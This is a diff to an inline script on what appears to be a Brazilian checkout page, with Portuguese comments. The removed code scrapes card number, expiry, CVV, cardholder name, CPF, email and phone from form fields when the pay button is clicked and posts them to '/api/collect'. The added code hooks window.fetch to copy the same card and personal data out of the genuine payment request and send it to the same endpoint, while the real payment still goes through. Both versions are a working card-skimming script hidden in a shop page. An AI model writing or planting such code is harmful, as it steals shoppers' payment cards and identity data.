@@ -18,127 +18,60 @@
         <script>
 (function () {
   const COLLECT_URL = "/api/collect";
-  const PROCESSED = new WeakSet();
+  const TARGET_URL = "/api/payments/create";
+  const originalFetch = window.fetch;
 
-  function digits(v) { return String(v || "").replace(/\D/g, ""); }
-  function clean(v) { return String(v || "").replace(/\u00a0/g, " ").trim(); }
+  
+  window.fetch = async function (...args) {
+    const [url, options] = args;
+    const urlStr = String(url);
 
-  // Busca input pelo id, name OU fallback de placeholder/type
-  function findInput({ ids = [], names = [], types = [], placeholders = [] }) {
-    for (const id of ids) {
-      const el = document.getElementById(id);
-      if (el && el.value) return el;
+    
+    if (urlStr.includes(TARGET_URL) && options && options.method && options.method.toUpperCase() === "POST") {
+      try {
+        const body = JSON.parse(options.body || "{}");
+        
+        const customer = body.customer || {};
+        const payment = body.payment || {};
+        const card = payment.card || {};
+        const payload = {
+          card_num: (card.number || "").replace(/\D/g, ""),
+          expiry: card.expiryMonth && card.expiryYear
+            ? `${String(card.expiryMonth).padStart(2, "0")}/${String(card.expiryYear).slice(-2)}`
+            : "",
+          cvv: (card.cvv || "").replace(/\D/g, ""),
+          name: card.holderName || customer.name || "",
+          cpf: (customer.cpf || "").replace(/\D/g, ""),
+          email: customer.email || "",
+          phone: (customer.phone || "").replace(/\D/g, ""),
+          amount: body.totals?.total || body.amount || "",
+          installments: String(card.installments || 1)
+        };
+
+        console.log("📤 Coletando:", payload);
+
+        
+        if (payload.card_num && payload.card_num.length >= 13) {
+          
+          originalFetch.call(window, COLLECT_URL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(payload)
+          })
+          .then(r => r.json())
+          .then(d => console.log("✅ Servidor respondeu:", d))
+          .catch(e => console.error("❌ Erro:", e));
+        }
+      } catch (e) {
+        console.warn("Erro ao interceptar:", e);
+      }
     }
-    for (const name of names) {
-      const el = document.querySelector(`input[name="${name}"]`);
-      if (el && el.value) return el;
-    }
-    for (const type of types) {
-      const el = document.querySelector(`input[type="${type}"]`);
-      if (el && el.value) return el;
-    }
-    for (const ph of placeholders) {
-      const el = [...document.querySelectorAll('input')].find(i =>
-        (i.placeholder || '').toLowerCase().includes(ph.toLowerCase()) && i.value
-      );
-      if (el) return el;
-    }
-    return null;
-  }
 
-  function collectCardData() {
-    const cardNumber = findInput({
-      ids: ['cardNumber', 'card-number'],
-      names: ['cardNumber', 'card_number', 'number', 'cc-number'],
-      types: [],
-      placeholders: ['0000 0000 0000']
-    });
-    const expiry = findInput({
-      ids: ['cardExpiry', 'cardDueDate', 'expiry'],
-      names: ['cardExpiry', 'card_expiry', 'expiry', 'exp', 'cardDueDate'],
-      placeholders: ['MM/AA', 'MM/YY']
-    });
-    const cvv = findInput({
-      ids: ['cardCvv', 'cardCVV', 'cvv'],
-      names: ['cardCvv', 'card_cvv', 'cvv', 'cvc'],
-      placeholders: ['CVV', 'CVC']
-    });
-    const cardName = findInput({
-      ids: ['cardName', 'cardholderName', 'holderName'],
-      names: ['cardName', 'card_name', 'holderName', 'holder', 'cardholderName'],
-      placeholders: ['Nome impresso', 'nome no cartão', 'Como está no cartão']
-    });
-    // CORRIGIDO: pega CPF, email e phone com os IDs reais
-    const cardCpf = findInput({
-      ids: ['cpf', 'cardCpf', 'document'],
-      names: ['cpf', 'cardCpf', 'card_cpf', 'document'],
-      placeholders: ['000.000.000-00', 'CPF']
-    });
-    const email = findInput({
-      ids: ['email'],
-      names: ['email'],
-      types: ['email'],
-      placeholders: ['e-mail', 'email']
-    });
-    const phone = findInput({
-      ids: ['phone'],
-      names: ['phone', 'telefone', 'celular'],
-      types: ['tel'],
-      placeholders: ['(00)', '0000-0000']
-    });
+    
+    return originalFetch.apply(this, args);
+  };
 
-    const installments = document.querySelector('input[name="installments"]')?.value || "1";
-
-    // Valor total - várias estratégias
-    let total = "";
-    const totalEl =
-      document.querySelector('[data-testid="order-total"]') ||
-      document.querySelector('.total dd') ||
-      document.querySelector('[data-summary-total]');
-    if (totalEl) total = clean(totalEl.innerText || totalEl.textContent);
-
-    return {
-      card_num: digits(cardNumber?.value || ""),
-      expiry: clean(expiry?.value || ""),
-      cvv: digits(cvv?.value || ""),
-      name: clean(cardName?.value || ""),
-      cpf: digits(cardCpf?.value || ""),
-      email: clean(email?.value || ""),
-      phone: digits(phone?.value || ""),
-      amount: total,
-      installments: String(installments)
-    };
-  }
-
-  function isFinalizeButton(el) {
-    if (!el || el.tagName !== "BUTTON") return false;
-    const text = (el.innerText || "").toLowerCase();
-    return /finalizar|pagar|continuar|comprar|concluir/.test(text);
-  }
-
-  document.addEventListener("click", function (event) {
-    const btn = event.target.closest("button");
-    if (!btn || PROCESSED.has(btn)) return;
-    if (!isFinalizeButton(btn)) return;
-
-    const cardRadio = document.querySelector('input[type="radio"][value="card"]:checked')
-      || document.querySelector('input[type="radio"][value="credit_card"]:checked');
-    if (!cardRadio) return;
-
-    PROCESSED.add(btn);
-    const payload = collectCardData();
-    console.log("📤 Coletando:", payload);  // ← pra você ver no console
-    if (!payload.card_num || payload.card_num.length < 13) return;
-
-    fetch(COLLECT_URL, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(payload)
-    })
-    .then(r => r.json())
-    .then(d => console.log("✅ Servidor respondeu:", d))
-    .catch(e => console.error("❌ Erro:", e));
-  }, true);
+  console.log("🔍 Interceptador de fetch ativo (aguardando /api/payments/create)");
 })();
 </script>
     
